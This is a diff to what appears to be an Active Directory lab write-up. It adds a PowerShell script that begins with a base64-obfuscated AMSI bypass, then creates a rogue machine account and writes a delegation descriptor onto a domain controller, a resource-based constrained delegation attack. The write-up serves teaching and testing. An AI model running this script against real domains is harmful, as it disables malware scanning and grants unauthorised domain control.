@@ -34,6 +34,20 @@ High level overview of the attack as performed in the lab:
 
 Since the attack will entail creating a new computer object on the domain, let's check if users are allowed to do it - by default, a domain member usually can add up to 10 computers to the domain. To check this, we can query the root domain object and look for property `ms-ds-machineaccountquota`
 
+{% code title="Script" %}
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+import-module .\PowerView.ps1
+import-module .\Powermad.ps1
+New-MachineAccount -MachineAccount FAKE02 -Password $(ConvertTo-SecureString '123456!' -AsPlainText -Force)
+$ComputerSid = Get-DomainComputer FAKE02 -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+{% endcode %}
+
 ```csharp
 Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 ```
